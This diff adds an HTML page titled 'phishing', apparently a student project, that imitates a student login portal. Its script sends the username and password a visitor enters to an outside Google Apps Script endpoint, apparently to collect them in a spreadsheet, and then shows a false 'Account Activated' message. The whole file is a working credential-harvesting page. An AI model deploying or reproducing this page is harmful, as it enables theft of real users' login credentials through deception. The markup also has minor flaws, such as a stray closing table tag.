@@ -1,0 +1,53 @@
+<html>
+    <head>
+        <title>
+            phishing
+        </title>
+        <link rel="stylesheet" href="style1.css">
+    </head>
+    <body>
+<div id="contact">
+    <div class="container">
+        <div class="row">
+            <div class="image">
+                <img src="images/head.jpg">
+            </div>
+            <h1 class="sub-title"> STUDENT LOGIN</h1>
+            <div class="contact-left">
+                <form name="submit-to-google-sheet" >
+                    <input type="text" name="Name" placeholder="Enter your Username" required>
+                    <input type="password" name="Password" placeholder="password" required>
+                    <button type="submit" class="btn btn2"><b> Login</b></button>
+                    <span id="msg"></span>
+                </table>
+            </form>
+            
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="copyright">
+    <p>All Rights Reserved &copy; Mohammed Abuzarh Shaik-204G1A3323</p>
+  </div>
+                    
+    </body>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxAYyhlS1XqlHY20GH1m6bd1W3SEoCd10m-PyfXnTWv4mRJhLY8gddv5Qs-YoPt1Q1v5Q/exec'
+        const form = document.forms['submit-to-google-sheet']
+        const msg = document.getElementById("msg")
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                msg.innerHTML = " Account Activated..!"
+                setTimeout(function(){
+                    msg.innerHTML=""
+                },5000)
+                form.reset
+            })
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</html>
